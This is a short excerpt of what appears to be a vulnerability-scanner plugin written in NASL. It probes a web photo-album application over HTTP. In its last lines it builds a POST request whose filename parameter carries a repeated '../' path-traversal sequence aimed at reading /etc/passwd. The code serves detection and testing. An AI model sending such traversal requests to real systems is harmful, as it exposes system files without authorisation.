...
if(!IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) || !ContainsString( res, "<output>" )){
	exit( 99 );
}
...
headers = make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie );
req = http_get_req( port: port, url: url, add_headers: headers );
res = http_keepalive_send_recv( port: port, data: req );
if(!IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) || !ContainsString( res, "encodeURIComponent" )){
	exit( 0 );
}
...
file = "/etc/passwd";
data = "album=" + album_id + "&a=caption&ac=" + access_code + "&filename=" + crap( data: "../", length: 3 * 9 ) + file;
req = http_post_put_req( port: port, url: url, data: data, add_headers: headers );
